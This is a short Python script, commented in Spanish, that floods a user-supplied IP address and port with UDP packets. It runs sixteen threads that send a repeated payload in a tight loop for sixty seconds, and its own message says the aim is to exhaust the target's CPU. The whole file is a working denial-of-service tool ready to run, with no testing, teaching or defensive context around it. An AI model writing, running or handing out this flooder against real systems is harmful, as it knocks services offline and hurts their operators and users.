import socket
import threading
import time

def flood_cpu(ip, port, duration=60, threads=16):
    payload = b"CPU" * 400  # Paquete pequeño, mucho tráfico por segundo
    end_time = time.time() + duration

    def sender():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                sock.sendto(payload, (ip, port))
            except Exception:
                pass
        sock.close()

    ths = []
    for _ in range(threads):
        t = threading.Thread(target=sender)
        t.start()
        ths.append(t)
    for t in ths:
        t.join()

if __name__ == "__main__":
    ip_destino = input("IP destino: ").strip()
    puerto_destino = int(input("Puerto destino: ").strip())
    duracion = 60  # Puedes cambiarlo si quieres
    hilos = 16     # Puedes cambiarlo si quieres
    print(f"Enviando paquetes para intentar consumir CPU en {ip_destino}:{puerto_destino} durante {duracion} segundos con {hilos} hilos...")
    flood_cpu(ip_destino, puerto_destino, duration=duracion, threads=hilos)
    print("Finalizado.")
